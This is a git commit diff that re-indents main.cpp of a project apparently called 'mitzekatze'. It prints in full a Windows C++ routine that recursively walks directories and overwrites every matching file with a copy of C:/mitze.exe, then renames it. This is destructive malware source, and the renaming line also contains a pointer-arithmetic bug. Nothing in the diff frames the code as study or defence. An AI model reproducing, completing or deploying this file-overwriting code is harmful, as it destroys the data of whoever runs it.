1105d740e46b202fb38ed1982bec879442351f13
Groove <63636914+Groovemaker@users.noreply.github.com>
2020-08-03 16:50:49 +0200

    Update main.cpp

--- mitzekatze/main.cpp
+++ mitzekatze/main.cpp
@@ -8,59 +8,59 @@ string Chain = "";
 
 void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
-  if (recursively)
-    FckFiles(directory, fileFilter, false);
+	if (recursively)
+		FckFiles(directory, fileFilter, false);
 
-  directory += "\\";
+	directory += "\\";
 
-  WIN32_FIND_DATA FindFileData;
-  HANDLE hFind = INVALID_HANDLE_VALUE;
+	WIN32_FIND_DATA FindFileData;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
 
-  std::string filter = directory + (recursively ? "*" : fileFilter);
+	std::string filter = directory + (recursively ? "*" : fileFilter);
 
-  hFind = FindFirstFile(filter.c_str(), &FindFileData);
+	hFind = FindFirstFile(filter.c_str(), &FindFileData);
 
-  if (hFind == INVALID_HANDLE_VALUE)
-  {
-    return;
-  }
-  else
-  {
-    if (!recursively)
-    {
+	if (hFind == INVALID_HANDLE_VALUE)
+	{
+		return;
+	}
+	else
+	{
+		if (!recursively)
+		{
 		Chain = Chain + sWords[rand() % 4];
 		cout << Chain;
-    	string Chickfila = directory + std::string(FindFileData.cFileName);
-		CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
-  		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
-    }
+			string Chickfila = directory + std::string(FindFileData.cFileName);
+			CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+			rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
+		}
 
-    while (FindNextFile(hFind, &FindFileData) != 0)
-    {
-      if (!recursively)
-      {
+		while (FindNextFile(hFind, &FindFileData) != 0)
+		{
+			if (!recursively)
+			{
 		Chain = Chain + sWords[rand() % 4];
 		cout << Chain;
-        string Chickfila = directory + std::string(FindFileData.cFileName);
-        CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
-  		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
-      }
-      else
-      {
-        if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
-        {
-          FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
-        }
-      }
-    }
+				string Chickfila = directory + std::string(FindFileData.cFileName);
+				CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
+			}
+			else
+			{
+				if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
+				{
+					FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
+				}
+			}
+		}
 
-    DWORD dwError = GetLastError();
-    FindClose(hFind);
-    if (dwError != ERROR_NO_MORE_FILES)
-    {
-      std::cout << "FindNextFile error. Error is "<< dwError << std::endl;
-    }
-  }
+		DWORD dwError = GetLastError();
+		FindClose(hFind);
+		if (dwError != ERROR_NO_MORE_FILES)
+		{
+			std::cout << "FindNextFile error. Error is "<< dwError << std::endl;
+		}
+	}
 }
 
 int main(int argc, char* argv[])
